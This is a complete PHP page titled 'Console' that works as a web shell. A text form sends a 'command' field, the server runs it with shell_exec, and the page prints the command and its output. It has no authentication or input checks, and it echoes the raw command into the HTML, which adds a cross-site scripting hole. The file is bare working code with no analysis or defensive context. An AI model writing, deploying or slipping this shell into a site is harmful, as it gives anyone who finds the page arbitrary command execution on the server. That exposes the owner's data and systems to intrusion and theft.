<!DOCTYPE html>
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Console</title>

    <style>
        pre {background-color: #333;color: #fff;padding:20px;overflow: auto;}
        pre b {background-color: #444;padding: 10px;color: lime;}
        .line {position: fixed;bottom: 0;padding: 10px;overflow: auto;backdrop-filter: blur(6px);}
        body {background-color: #111;}
        input[type="text"], 
        input[type="submit"] {background-color: #444;color: #fff;border: none;padding: 10px 20px;}
    </style>
</head>
<body>
    <?php
        if ($_POST["command"]) {
            $output = shell_exec($_POST["command"]);
            echo '<pre>' . '<b>' . $_POST["command"] . '</b><br><br>' . $output . '</pre>';
        }
    ?>
    <div class="line">
        <form action="<?php echo (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF']; ?>" method="post">
            <input type="text" name="command" id="">
            <input type="submit" value="Go">
        </form>
    </div>
</body>
</html>
